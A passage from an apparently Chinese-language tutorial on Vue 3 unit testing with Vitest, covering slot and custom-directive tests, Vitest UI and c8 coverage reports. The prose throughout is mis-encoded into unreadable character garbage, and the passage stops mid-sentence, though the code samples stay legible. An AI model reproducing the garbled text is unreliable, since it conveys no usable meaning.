è¨­æœªå‚³å…¥çš„ç‹€æ…‹èˆ‡å‚³å…¥è³‡æ–™å¾Œçš„ç‹€æ…‹å…©ç¨®ï¼Œæ–·è¨€æ™‚æ‡‰è©²è‡³å°‘åŒ…å«é€™å…©ç¨®ç‹€æ…‹ã€‚ ä»¥ slots è¡Œç‚ºä½œç‚ºæ¡ˆä¾‹æ–·è¨€æ™‚ï¼Œæ–·è¨€å…§å®¹è¦å°ˆæ³¨åœ¨ slots æ‰€å½±éŸ¿ç¯„åœå…§ï¼Œå¦å‰‡å¯èƒ½æœƒå—å…¶ä»–å› ç´ å¹²æ“¾ã€‚ é è¨­æ’æ§½ï¼ˆDefault slotsï¼‰ 1 2 3 4 5 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;slot\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; è¦é‡å°æœ€åŸºæœ¬çš„é è¨­æ’æ§½åšæ–·è¨€æ™‚ï¼Œæˆ‘å€‘å¯ä»¥é€éå®¹å™¨ä¸­ç¬¬äºŒå€‹åƒæ•¸å¸¶å…¥ slots æ¬„ä½ä¾†æ¨¡æ“¬å¸¶å…¥å…§å®¹ä¸¦é€é default å±¬æ€§å‚³å…¥æŒ‡å®šçš„ç¯„åœå…§ã€‚\næœªå‚³å…¥æ¸¬è©¦æ¡ˆä¾‹ï¼š\n1 2 3 4 it(\u0026#39;default slot\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component) expect(wrapper.html()).toMatchInlineSnapshot() }) å‚³å…¥æ™‚æ¸¬è©¦æ¡ˆä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 it(\u0026#39;default slot\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component, { slots: { default: \u0026#39;Slot Content\u0026#39;, }, }) expect(wrapper.html()).toContain(\u0026#39;Slot Content\u0026#39;) }) å…·åæ’æ§½ï¼ˆNamed slotsï¼‰ 1 2 3 4 5 6 7 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;slot name=\u0026#34;header\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;slot name=\u0026#34;body\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;slot name=\u0026#34;footer\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; è‹¥åœ¨æ’æ§½çš„å‹æ…‹ç‚ºå…·åæ’æ§½ï¼Œåœ¨æ’°å¯«æ¸¬è©¦æ¡ˆä¾‹æ™‚çš„å®¹å™¨é¸é … slots å°±å¯ä»¥ä¾æ“šæ’æ§½åç¨± name æŒ‡å®šè¦å‚³å…¥çš„å…§å®¹ã€‚\næœªå‚³å…¥æ¸¬è©¦æ¡ˆä¾‹ï¼š\n1 2 3 4 it(\u0026#39;named slot\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component) expect(wrapper.html()).toMatchInlineSnapshot() }) å‚³å…¥æ™‚æ¸¬è©¦æ¡ˆä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 it(\u0026#39;named slot\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component, { slots: { header: \u0026#39;ithelp 2022 éµäººè³½\u0026#39;, body: \u0026#39;vue3 å–®å…ƒæ¸¬è©¦\u0026#39;, footer: \u0026#39;by Shawn\u0026#39;, }, }) expect(wrapper.html()).toMatchInlineSnapshot() }) ä½œç”¨åŸŸæ’æ§½ï¼ˆScoped slotsï¼‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;p\u0026gt;è²“å’ªå’–å•¡å»³ï¼š\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;åº—é•·ï¼šShawn\u0026lt;/p\u0026gt; \u0026lt;slot :staffInfo=\u0026#34;staffInfo\u0026#34;\u0026gt;\u0026lt;/slot\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script setup\u0026gt; const staffInfo = { \u0026#39;black-cat\u0026#39;: { name: \u0026#39;é»‘é»‘\u0026#39;, \u0026#39;signature-dish\u0026#39;: \u0026#39;æ‹¿éµ\u0026#39;, }, \u0026#39;orange-cat\u0026#39;: { name: \u0026#39;é˜¿æ©˜\u0026#39;, \u0026#39;signature-dish\u0026#39;: \u0026#39;ç„¦ç³–ç‘ªå¥‡æœµ\u0026#39;, }, } \u0026lt;/script\u0026gt; æœ‰æ™‚å€™æˆ‘å€‘å¯èƒ½æƒ³è¦çµ¦äºˆæ›´é«˜åº¦çš„å½ˆæ€§ï¼Œä½¿å…ƒä»¶é€é \u0026lt;slot\u0026gt; å‚³éè³‡æ–™çµ¦çˆ¶å±¤æ™‚ï¼Œé€™æ™‚å€™å°±æœƒç”¨åˆ°ä½œç”¨åŸŸæ’æ§½ã€‚\næœªå‚³å…¥æ¸¬è©¦æ¡ˆä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 it(\u0026#39;scoped slots\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component) expect(wrapper.html()).toMatchInlineSnapshot(` \u0026#34;\u0026lt;div\u0026gt; \u0026lt;p\u0026gt;è²“å’ªå’–å•¡å»³ï¼š\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;åº—é•·ï¼šShawn\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt;\u0026#34; `) }) å‚³å…¥æ™‚æ¸¬è©¦æ¡ˆä¾‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 it(\u0026#39;scoped slots\u0026#39;, async () =\u0026gt; { const wrapper = mount(Component, { slots: { default: ` \u0026lt;template #staffInfo\u0026gt; \u0026lt;p\u0026gt;åº—å“¡ï¼š{{ staffInfo[\u0026#39;orange-cat\u0026#39;][\u0026#39;name\u0026#39;] }}\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;é™å®šé …ç›®ï¼š{{ staffInfo[\u0026#39;black-cat\u0026#39;][\u0026#39;signature-dish\u0026#39;] }}\u0026lt;/p\u0026gt; \u0026lt;/template\u0026gt; `, }, }) expect(wrapper.html()).toMatchInlineSnapshot(` \u0026#34;\u0026lt;div\u0026gt; \u0026lt;p\u0026gt;è²“å’ªå’–å•¡å»³ï¼š\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;åº—é•·ï¼šShawn\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;åº—å“¡ï¼šé˜¿æ©˜\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;é™å®šé …ç›®ï¼šæ‹¿éµ\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt;\u0026#34; `) }) æ’æ§½è¼‰å…¥é¸é …ï¼ˆMounting optionsï¼‰ è‹¥æƒ³åœ¨æ¸¬è©¦æ¡ˆä¾‹ä¸­ç”¨ä¸åŒçš„æ–¹å¼ä¾†æ¨¡æ“¬ slotsï¼Œå¯ä»¥é€éä¸‹é¢å››ç¨®èªæ³•ï¼š\nå‚³å…¥ SFC æª”æ¡ˆ render function åŒ…å« template å±¬æ€§çš„ç‰©ä»¶ ç›´æ¥å‚³å…¥ä¸€å€‹å­—ä¸² 1 2 3 4 5 6 7 8 9 10 11 it(\u0026#39;should render same layout\u0026#39;, () =\u0026gt; { const wrapper = mount(Layout, { slots: { default: Component // default: h(\u0026#39;div\u0026#39;, \u0026#39;ç›¸åŒå…§å®¹\u0026#39;), // default: { template: \u0026#39;\u0026lt;div\u0026gt;ç›¸åŒå…§å®¹\u0026lt;/div\u0026gt;\u0026#39; }, // default: \u0026#39;\u0026lt;div\u0026gt;ç›¸åŒå…§å®¹\u0026lt;/div\u0026gt;\u0026#39;, } }) expect(wrapper.html()).toContain(\u0026#39;\u0026lt;div\u0026gt;ç›¸åŒå…§å®¹\u0026lt;/div\u0026gt;\u0026#39;) }) custom directives å®¢è£½åŒ–æŒ‡ä»¤æœ¬èº«æ­é…äº†é¡ä¼¼å…ƒä»¶ç”Ÿå‘½é€±æœŸçš„ Hooksï¼Œè€Œæˆ‘å€‘å¯ä»¥åœ¨é‚£äº› Hook ä¸­ä»»æ„å°æˆ‘å€‘æ‰€ç¶å®šçš„å…ƒç´ åšé–‹ç™¼ï¼Œè®“ç¹è¤‡çš„é‚è¼¯é€éç°¡å–®çš„æŒ‡ä»¤å°±èƒ½å¤ é‡è¤‡åˆ©ç”¨ï¼Œä½¿æˆ‘å€‘åœ¨é–‹ç™¼éç¨‹ä¸­çš„é–‹ç™¼è€…é«”é©—ï¼ˆDeveloper experience, DXï¼‰æœ‰éå¸¸è‰¯å¥½çš„é«”é©—ã€‚\nä½†ç›¸å°çš„ä¾†èªªï¼Œè¦æ¸¬è©¦å®¢è£½åŒ–æŒ‡ä»¤å°±æœ‰æ©Ÿæœƒé‹ç”¨åˆ°å„ç¨®æˆ‘å€‘è‡³ä»Šå­¸éçš„è¨±å¤šæŠ€å·§ä¾†æ–·è¨€ï¼Œå¾è€Œä½¿é›£åº¦å¤§å¤§æå‡ï¼Œä½†æˆ‘å€‘åªè¦ç†Ÿæ‚‰ä¹‹å‰çš„æ¨¡æ“¬æŠ€å·§å¾Œï¼Œæœ€å¾Œåªéœ€è¦é—œæ³¨çš„ä¸€å€‹åœ°æ–¹å°±æ˜¯ï¼Œé æœŸæŒ‡ä»¤æ”¾å…¥å¾Œæ‡‰é”æˆä»€éº¼ç›®æ¨™ï¼Œæ¥è‘—å†å»å°‹æ‰¾è¦å¾ä»€éº¼è§’åº¦æˆ–å¯å–å¾—çš„è³‡è¨Šå»æ¯”å°ä¾†ä½œç‚ºæˆ‘å€‘æ–·è¨€çš„å…§å®¹å³å¯ã€‚\nè€Œæ¥ä¸‹ä¾†æˆ‘å€‘ä»¥ä¸€å€‹ v-foucs çš„å®¢è£½åŒ–æŒ‡ä»¤ä¾†ä»‹ç´¹å¦‚ä½•æ–·è¨€å®¢è£½åŒ–æŒ‡ä»¤èˆ‡å°‹æ‰¾æ¯”å°è³‡è¨Šï¼š\n1 2 3 const vFocus = { mounted: (el) =\u0026gt; el.focus(), } è¨»å†ŠæŒ‡ä»¤ é¦–å…ˆï¼Œè¦é€²è¡Œæ–·è¨€æˆ‘å€‘å¯ä»¥é€éå®¹å™¨ä¸­ç¬¬äºŒå€‹åƒæ•¸çš„ global.directives ä¾†è¨»å†Šæˆ‘å€‘çš„å®¢è£½åŒ–æŒ‡ä»¤ï¼š\n1 2 3 4 5 6 7 const wrapper = mount(..., { global: { directives: { Focus: vFocus, // å±¬æ€§åŒ¹é…çš„åç¨±è¦å‰‡ Abc æœƒ match åˆ° v-abc }, }, }) ä»¿é€ å…ƒä»¶ä¸¦æ”¾å…¥æŒ‡ä»¤ æ¥è‘—æˆ‘å€‘è¦ä½¿ç”¨åˆ°ä»¿é€ å…ƒä»¶çš„æŠ€å·§ï¼Œè®“å®¹å™¨ä¸€é–‹å§‹å°±è¼‰å…¥ä¸€å€‹å‡çš„å…ƒä»¶ï¼Œä¸¦ä¸”æ”¾å…¥æŒ‡ä»¤èˆ‡ data-test å±¬æ€§ä¾›æ•ç²ï¼š\n1 2 3 4 5 6 7 8 9 10 const Component = { template: \u0026#39;\u0026lt;input v-focus data-test=\u0026#34;target\u0026#34; type=\u0026#34;text\u0026#34;/\u0026gt;\u0026#39;, } const wrapper = mount(..., { global: { directives: { Focus: vFocus, }, }, }) å°‹æ‰¾æ¯”å°ç›®æ¨™ å†ä¾†ï¼Œç”±æ–¼ç›®æ¨™æ˜¯ç‚ºäº†é©—è­‰æ˜¯å¦è©²å…ƒç´ ç‚ºç€è¦½å™¨ä¸­çš„ focus å…ƒç´ ï¼Œå› æ­¤è¦åˆ©ç”¨åˆ°ç€è¦½å™¨ç‰©ä»¶ Document ä¸­çš„ activeElement å±¬æ€§ï¼Œè‹¥æœ‰è¢«èšç„¦çš„æƒ…æ³ä¸‹é‚£æ‡‰è©²è¦èƒ½å¤ æ¯”å°åˆ°åŒå€‹å…ƒç´ ã€‚ï¼ˆç”± jsdom æä¾›æ¨¡æ“¬çš„ç€è¦½å™¨ç’°å¢ƒï¼‰\næ–·è¨€ æœ€å¾Œåœ¨æ–·è¨€çš„éƒ¨åˆ†ï¼Œç‚ºäº†å–å¾—ç›®æ¨™å…ƒç´ ï¼Œæˆ‘å€‘å¯ä»¥é€é wrapper.find().element å–å¾—ç›®æ¨™çš„å…ƒç´ å¯¦é«”ï¼Œæœ€å¾Œå°±å¯ä»¥æ‹¿ä»–èˆ‡ document.activeElement åšæ¯”å°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 it(\u0026#39;v-focus\u0026#39;, async () =\u0026gt; { const Component = { template: \u0026#39;\u0026lt;input v-focus data-test=\u0026#34;target\u0026#34; type=\u0026#34;text\u0026#34;/\u0026gt;\u0026#39;, } const wrapper = mount(Component, { attachTo: document.body, global: { directives: { Focus: vFocus, }, }, }) expect(wrapper.find(\u0026#39;[data-test=\u0026#34;target\u0026#34;]\u0026#39;).element).toBe(document.activeElement) }) å¦‚æ­¤ä¸€ä¾†æˆ‘å€‘å°±å¯ä»¥ç¢ºä¿å°‡ä¾†åœ¨ä½¿ç”¨ v-focus æŒ‡ä»¤æ™‚ï¼Œè©²å…ƒç´ åœ¨ mounted å¾Œæœƒæ˜¯èšç„¦çš„å…ƒç´ ã€‚\nVitest UI Vitest UI\nVitest UI ç°¡å–®ä¾†èªªï¼Œæ˜¯å¦ä¸€ç¨®ä¾›æˆ‘å€‘æŸ¥çœ‹æ¸¬è©¦èˆ‡ç·¨å¯«æ¸¬è©¦çš„æ–¹å¼ï¼Œå®ƒçš„ç‰¹è‰²åœ¨æ–¼åŸºæ–¼ Vite çš„ dev server ç’°å¢ƒï¼Œè®“æˆ‘å€‘å¯ä»¥ç›´æ¥åœ¨ç€è¦½å™¨ä¸Šç›´æ¥è§€çœ‹æ¸¬è©¦æ¡ˆä¾‹çš„æ¸¬è©¦çµæœï¼Œç”šè‡³æ”¯æ´ç›´æ¥åœ¨ç€è¦½å™¨ä¸­ç·¨å¯«æ¸¬è©¦æ¡ˆä¾‹å¾ŒåŒæ­¥æ›´æ–°æ¸¬è©¦æª”æ¡ˆã€‚\nè€Œåœ¨ä½¿ç”¨é€™é …é…·é…·çš„åŠŸèƒ½ä¹‹å‰ï¼Œæˆ‘å€‘éœ€è¦å¦å¤–å®‰è£ @vitest/uiï¼š\n1 npm i -D @vitest/ui æ¥è‘—å°±å¯ä»¥åœ¨ package.json ä¸­æ–°å¢ä¸€å€‹ vitest æŒ‡ä»¤ï¼Œä¸¦å¸¶ä¸Šåƒæ•¸ --uiï¼š\n1 2 3 4 5 { \u0026#34;scripts\u0026#34;: { \u0026#34;vitest:ui\u0026#34;: \u0026#34;vitest --ui\u0026#34; } } å¦‚æ­¤ä¸€ä¾†å¾Œå€‘åªè¦åŸ·è¡Œ npm run vitest:uiï¼Œå°±å¯ä»¥åœ¨å•Ÿå‹•é€™é …åŠŸèƒ½ï¼Œä¸¦çœ‹åˆ°ä¸‹åˆ—ç•«é¢ï¼š\nä»‹é¢ åœ¨ Vitest UI ä¸­ï¼Œå·¦å´æ˜¯æ‰€æœ‰æ¸¬è©¦æ¡ˆä¾‹çš„æ¸¬è©¦çµæœï¼ˆPass / Fail / Skipï¼‰ï¼Œæˆ‘å€‘å¯ä»¥é€éä¸Šæ–¹çš„æœå°‹æ¬„è¼¸å…¥æª”åæˆ–è·¯å¾‘æ‰¾åˆ°æˆ‘å€‘è¦è§€å¯Ÿçš„æ¸¬è©¦ã€‚\né»æ“Šå·¦å´çš„æ¸¬è©¦è·¯å¾‘å¾Œï¼Œå³å´æœƒå‡ºç¾æ¸¬è©¦æƒ…å¢ƒèˆ‡æ¸¬è©¦æ¡ˆä¾‹çš„æè¿°è®“æˆ‘å€‘æ›´å¥½è§€å¯Ÿç•¶ä¸‹æª”æ¡ˆä¸­çš„æ‰€æœ‰æ¡ˆä¾‹\né™¤æ­¤ä¹‹å¤–ï¼Œå†å¾€å³å´æœƒçœ‹åˆ°å››é …è³‡è¨Šï¼Œåˆ†åˆ¥ç‚ºï¼š\nReportï¼ˆé è¨­é¡¯ç¤ºé …ç›®ï¼‰ Module Graph Console Code Report é»æ“Š Report é ç±¤æ™‚ï¼Œæœƒåœ¨å³å´é¡¯ç¤ºè©²æ¸¬è©¦æª”æ¡ˆä¸­çš„æ‰€æœ‰æ¸¬è©¦æ¡ˆä¾‹çµæœã€‚\nè‹¥ç‚ºå…¨é€šéçš„æƒ…æ³æœƒé¡¯ç¤º All tests passed in this fileï¼š\nè‹¥æœ‰éŒ¯èª¤æœƒé¡¯ç¤ºæ˜¯å“ªä¸€æ¢æ¸¬è©¦æ¡ˆä¾‹ç™¼ç”ŸéŒ¯èª¤ï¼š\næˆ‘å€‘ç”šè‡³èƒ½é»æ“ŠéŒ¯èª¤è¨Šæ¯å³æ–¹çš„é–‹å•Ÿè¦–çª— Iconï¼ŒVitest UI å°‡æœƒç›´æ¥å•Ÿå‹•ç³»çµ±é è¨­çš„ç¨‹å¼ç¢¼ç·¨è¼¯å™¨ï¼Œé–‹å•Ÿæ¸¬è©¦æª”æ¡ˆå¾Œå°‡è¼¸å…¥æ¸¸æ¨™èšç„¦åœ¨éŒ¯èª¤çš„è¡Œæ•¸èˆ‡ä½ç½®ã€‚ï¼ˆe.g. åœ–ä¸­çš„ toEqual Assertion Matcherï¼‰\nModule Graph æ¥è‘—æ˜¯ç¬¬äºŒå€‹é ç±¤çš„ Module Graphï¼Œé€™é çš„å…§å®¹ä¸»è¦æ˜¯é€éæª¢æ¸¬è¡Œå…§å¼•å…¥æ¨¡çµ„ï¼Œå‘ˆç¾æª”æ¡ˆä¹‹é–“ä¾è³´é—œä¿‚ã€‚\né»æ“Šåœ–ä¸­çš„ç¯€é»å¯ä»¥çœ‹åˆ°è©²æ¨¡çµ„çš„ Source æª”èˆ‡ç¶“ç”± Transformed å¾Œçš„ç¨‹å¼ç¢¼ã€‚\nè€Œé€™å€‹åœ–è¡¨æœ€å¤§çš„ç”¨è™•åœ¨æ–¼ï¼Œé€éå¯è¦–åŒ–çš„æ–¹å¼å‘ˆç¾å‡ºæ¸¬è©¦ç¨‹å¼ç¢¼ä¸­å—æ¸¬ç‰©ï¼ˆSUTï¼‰èˆ‡ä¾è³´ç‰©ï¼ˆDOCï¼‰çš„ä¾è³´ç‹€æ³ã€‚\nConsole Console é ç±¤ä¸»è¦æ˜¯é¡¯ç¤ºåœ¨æ¸¬è©¦ç¨‹å¼ç¢¼ä¸­çš„ console.log è³‡è¨Šï¼Œç”±æ–¼èˆ‡æ¸¬è©¦çµæœåˆ†é›¢çš„æƒ…æ³ä¸‹ï¼Œç›¸è¼ƒæ–¼åœ¨çµ‚ç«¯æ©Ÿä¸­è§€å¯Ÿ Consoleï¼Œé€™è£¡æœƒé¡¯ç¤ºå¾—æ›´åŠ æ¸…æ¥šã€‚\nCode æœ€å¾Œå£“è»¸ä»‹ç´¹çš„éƒ¨åˆ†ï¼Œå‰‡æ˜¯ Code é ç±¤ï¼Œä½ å¯èƒ½æœƒè¦ºå¾—é€™æœ‰ä»€éº¼ç‰¹åˆ¥çš„ï¼Œä¸å°±æ˜¯é¡¯ç¤ºæ¸¬è©¦æª”æ¡ˆç¨‹å¼ç¢¼å—ï¼Ÿ\nç„¶è€Œï¼Œé€™è£¡çš„æ¸¬è©¦ç¨‹å¼ç¢¼é™¤äº†é è¦½ä¹‹å¤–ï¼Œé‚„èƒ½å¤ ç›´æ¥åœ¨ç€è¦½å™¨ä¸­ç›´æ¥ç·¨å¯«ä¸¦åŸ·è¡Œæ¸¬è©¦æŸ¥çœ‹çµæœï¼Œæ›´é‡è¦çš„æ˜¯å¯«å®Œçš„ç•¶ä¸‹æŒ‰ä¸‹å„²å­˜å®ƒé‚„èƒ½å¤ åŒæ­¥èª¿æ•´åˆ°å¯¦éš›çš„ç¨‹å¼ç¢¼ä¸­ï¼\næ¯”æ–¹åœ¨ç€è¦½å™¨ä¸­çš„æ¸¬è©¦ç¨‹å¼ç¢¼ä¸­åŠ å€‹è¨»è§£ï¼Œä¸¦å„²å­˜ï¼š\nå¯¦éš›æ¸¬è©¦ç¨‹å¼ç¢¼æª”æ¡ˆä¹ŸåŠ ä¸Šäº†è¨»è§£ï¼\nå¦‚æ­¤ä¸€ä¾†ï¼Œæˆ‘å€‘å°±å¯ä»¥ç›´æ¥åœ¨é€™å€‹è¦–çª—å…§æ’°å¯«æˆ‘å€‘çš„æ¸¬è©¦æ¡ˆä¾‹ï¼Œä¸¦ä¸”åœ¨ç€è¦½å™¨ä¸­å³æ™‚çœ‹åˆ°æ¸¬è©¦çµæœã€‚\nä¸éé€™è£¡æœ‰å€‹å°å°ç¼ºé»æ˜¯ï¼Œè‹¥åœ¨å°ˆæ¡ˆä¸­æœ‰è¨­å®š eslint + prettier çš„è©±ï¼Œåœ¨ç¨‹å¼ç·¨è¼¯å™¨æ’°å¯«æ¸¬è©¦æ™‚å¯ä»¥è¨­å®šå„²å­˜ç•¶ä¸‹çš„è‡ªå‹•åšæ ¼å¼åŒ–ï¼Œä½†æ˜¯ç€è¦½å™¨ä¸­çš„ç·¨è¼¯å™¨ç’°å¢ƒä¸åŒï¼Œæ‰€ä»¥å¯«æ¸¬è©¦æ™‚æœƒæ”¶åˆ°æ ¼å¼éŒ¯èª¤çš„è­¦å‘Šï¼Œä½†åœ¨ä¸è€ƒæ…®é€™é»çš„æƒ…æ³ä¸‹ï¼Œé€™å€‹å·¥å…·æ˜¯å€‹ç”¨ä¾†æª¢è¦–æ¸¬è©¦çµæœèˆ‡ä¾è³´é—œä¿‚çš„å¥½å·¥å…·ã€‚\nç¨‹å¼ç¢¼è¦†è“‹ç‡ï¼ˆCode Coverageï¼‰ åœ¨æ¸¬è©¦é ˜åŸŸä¸­ï¼Œè¦†è“‹ç‡ï¼ˆCoverageï¼‰ä¸€è©æ³›æŒ‡çš„æ˜¯ä»¥ç™¾åˆ†æ¯”è¡¨ç¤ºæ¸¬è©¦ç¨‹å¼ç¢¼èƒ½å¤ æ¶µè“‹å¤šå°‘ç”¢å“ç¨‹å¼ç¢¼çš„ç¯„åœï¼Œè€Œä¾æ“šä¸åŒçš„è¦†è“‹ç‡ç¨®é¡ï¼Œå…¶ç´°å¾®çš„å®šç¾©ä¹Ÿæœƒæœ‰æ‰€ä¸åŒã€‚\næ¥ä¸‹ä¾†æˆ‘å€‘ä»¥è¦†è“‹ç‡å·¥å…·åº« c8 ä¾†èªªæ˜è¦†è“‹ç‡çš„æ¦‚å¿µèˆ‡å¦‚ä½•é€é c8 åœ¨ Vitest æ¸¬è©¦ç’°å¢ƒä¸­æª¢è¦–ç•¶ä¸‹çš„æ¸¬è©¦è¦†è“‹ç‡ï¼Œæœ€å¾Œå†ä¾†è«‡è«‡æœ‰é—œæ–¼è¦†è“‹ç‡çš„ç›¸é—œè­°é¡Œã€‚\nc8 è¦åœ¨ Vitest æ¸¬è©¦ç’°å¢ƒä¸­ä½¿ç”¨ c8 ç”¢ç”Ÿè¦†è“‹ç‡å ±å‘Šï¼Œæˆ‘å€‘é¦–å…ˆéœ€è¦å®‰è£ @vitest/coverage-c8ï¼š\n1 npm i -D @vitest/coverage-c8 æ¥è‘—å°±å¯ä»¥åœ¨ package.json ä¸­æ–°å¢æŒ‡ä»¤ï¼š\n1 2 3 4 5 { \u0026#34;scripts\u0026#34;: { \u0026#34;test:coverage\u0026#34;: \u0026#34;vitest --environment jsdom --coverage\u0026#34; } } åŸ·è¡Œ npm run test:coverage å¾Œï¼Œé è¨­æœƒåœ¨çµ‚ç«¯æ©Ÿç”¢ç”Ÿå‡ºè¦†è“‹ç‡å ±å‘Šï¼š\nè€Œ c8 è¦†è“‹ç‡å ±å‘Šç¸½å…±æœ‰å››ç¨®é¡å‹ï¼š\nè¡Œæ•¸è¦†è“‹ç‡ï¼ˆline coverageï¼‰ï¼šä»¥è¡Œæ•¸ç‚ºå–®ä½ä¾†è¨ˆç®—ã€‚ å‡½å¼è¦†è“‹ç‡ï¼ˆfunction coverageï¼‰ï¼šä»¥å…§éƒ¨çš„å‡½å¼ç‚ºå–®ä½ä¾†è¨ˆç®—ã€‚ åˆ†æè¦†è“‹ç‡ï¼ˆbranch coverageï¼‰ï¼šä»¥æ¯å€‹åˆ¤æ–·å¼ç‚ºå–®ä½ä¾†è¨ˆç®—ã€‚ èªå¥è¦†è“‹ç‡ï¼ˆstatement coverageï¼‰ï¼šä»¥æ¯å€‹èªå¥ï¼ˆstatementï¼‰ç‚ºå–®ä½è¨ˆç®—ã€‚ æ¸¬è©¦ç¨‹å¼ç¢¼æ¶µè“‹å¤šå°‘ç¯„åœçš„ç”¢å“ç¨‹å¼ç¢¼ï¼Œç”šè‡³æ–¼æ¯è¡Œç¨‹å¼ç¢¼å€‹è¢«åŸ·è¡Œäº†å¹¾æ¬¡\nä¸¦ä¸”è‹¥æœ‰æœªè¦†è“‹è¡Œæ•¸çš„æƒ…æ³ï¼Œ c8 å‰‡æœƒåœ¨ Uncovered Line ä¸­é¡¯ç¤ºæœªæ¶µè“‹çš„è¡Œæ•¸ç¯„åœï¼Œå¦‚ä¸‹åœ–ä¸­çš„ 13-17ã€19-28\nå€˜è‹¥ä½ è¦ºå¾—é€™ç¨®å ±å‘Šå½¢å¼ä¸æ–¹ä¾¿è§€çœ‹ï¼Œæˆ–æ˜¯å¸Œæœ›å°‡å®ƒè£½ä½œæˆæ–‡ä»¶ï¼Œå‰‡å¯ä»¥åœ¨ config.js æª”ä¸­è¨­å®š coverage.reporter çš„å½¢å¼ï¼š\n1 2 3 4 5 6 7 8 // vite.config.js or vitest.config.js export default defineConfig({ test: { coverage: { reporter: [\u0026#39;text\u0026#39;, \u0026#39;json\u0026#39;, \u0026#39;html\u0026#39;], }, }, }) å…¶ä¸­ c8 æä¾›çš„å ±å‘Šï¼ˆreporterï¼‰é¸é …æœ‰ä»¥ä¸‹ä¸‰ç¨®ï¼š\ntextï¼š åœ¨çµ‚ç«¯æ©Ÿä¸­å‘ˆç¾è¦†è“‹ç‡å ±å‘Šã€‚ jsonï¼š ä»¥ JSON æ ¼å¼ç”¢ç”Ÿè¦†è“‹ç‡å ±å‘Šã€‚ htmlï¼š ç”¢ç”Ÿä¸€å€‹å¯äº’å‹•çš„ HTML è¦†è“‹ç‡å ±å‘Šã€‚ å…¶ä¸­ HTML çš„ç‰ˆæœ¬ä¸­ï¼Œæˆ‘å€‘é‚„å¯ä»¥é»æ“Šæ¸¬è©¦æª”æ¡ˆä¾†æŸ¥çœ‹æœªè¦†è“‹çš„è¡Œæ•¸æœ‰å“ªäº›ï¼Œç›¸è¼ƒçµ‚ç«¯æ©Ÿçš„ç‰ˆæœ¬ï¼Œæˆ‘å€‘å°±ä¸å¿…å†æ‹¿è‘—è¡Œæ•¸å»å°ç¨‹å¼ç¢¼äº†ï¼š\nè¦†è“‹ç‡ç›®æ¨™ è€Œåœ¨ç­è§£æ€éº¼æŸ¥çœ‹è¦†è“‹ç‡å ±å‘Šå¾Œï¼Œé‚£éº¼ç©¶ç«Ÿè¦†è“‹ç‡ç›®æ¨™è¦é”åˆ°å¤šå°‘æ‰æ˜¯åˆç†å‘¢ï¼Ÿ\nä»¥ ã€Šå¯æ¸¬è©¦çš„ JavaScriptã€‹ä¸€æ›¸ä½œè€… Mark Ethan Trostler æä¾›çš„ç­”æ¡ˆæ˜¯å–®å…ƒæ¸¬è©¦å¤§ç´„è¦ä»‹æ–¼ 80 % å·¦å³ã€‚\nä»¥ Martin Fowler æ–¼ Test Coverage ä¸€æ–‡ä¸­ï¼Œå‰‡æ˜¯æŒ‡å‡ºå¤§ç´„æœƒåœ¨æ–¼ 80 è‡³ 90 % é™„è¿‘ã€‚\nè‡³æ–¼ç‚ºä»€éº¼ä¸æ˜¯é”åˆ°ç™¾åˆ†ä¹‹ç™¾å‘¢ï¼Ÿæ¥ä¸‹ä¾†æˆ‘å€‘ä¾†æ¢è¨æœ‰é—œæ–¼è¦†è“‹ç‡ç›¸é—œçš„è­°é¡Œã€‚\nè¦†è“‹ç‡è­°é¡Œ è¦†è“‹ç‡èˆ‡ä»˜å‡ºçš„å¿ƒåŠ› é›–ç„¶ä»¥ç†è«–ä¸Šä¾†èªªç›¡å¯èƒ½å¾—é”åˆ°é«˜è¦†è“‹ç‡ï¼Œæ¸¬è©¦ç¨‹å¼ç¢¼å°‡æ¶µè“‹çš„è¶Šå®Œå…¨ï¼Œç„¶è€Œç‚ºäº†è¿½æ±‚ 100 % çš„è¦†è“‹ç‡æ‰€è¦ä»˜å‡ºçš„å¿ƒç†å°‡æœƒæˆªç„¶ä¸åŒã€‚\nJeroen Mols åœ¨ The 100% code coverage problem ä¸€æ–‡ä¸­çš„æåˆ°äº†å¿ƒåŠ›ä»˜å‡ºèˆ‡è¦†è“‹ç‡çš„é—œä¿‚è¡¨ã€‚\nå¼•ç”¨è‡ª Jeroen Mols ã€ŠThe 100% code coverage problemã€‹ä¸€æ–‡ä¸­çš„åœ–\nå¾ä¸Šåœ–ä¸­å¯ä»¥çœ‹è¦‹ï¼Œåœ¨è¦†è“‹ç‡å¾ 0 æå‡è‡³ 80% æˆ‘å€‘åƒ…éœ€è¦ä»˜å‡ºä¸€äº›å¿ƒåŠ›å°±å¯ä»¥è¼•æ˜“é”æˆï¼Œç„¶è€Œè¦å°‡ 90% æå‡è‡³æ¥è¿‘ 100% 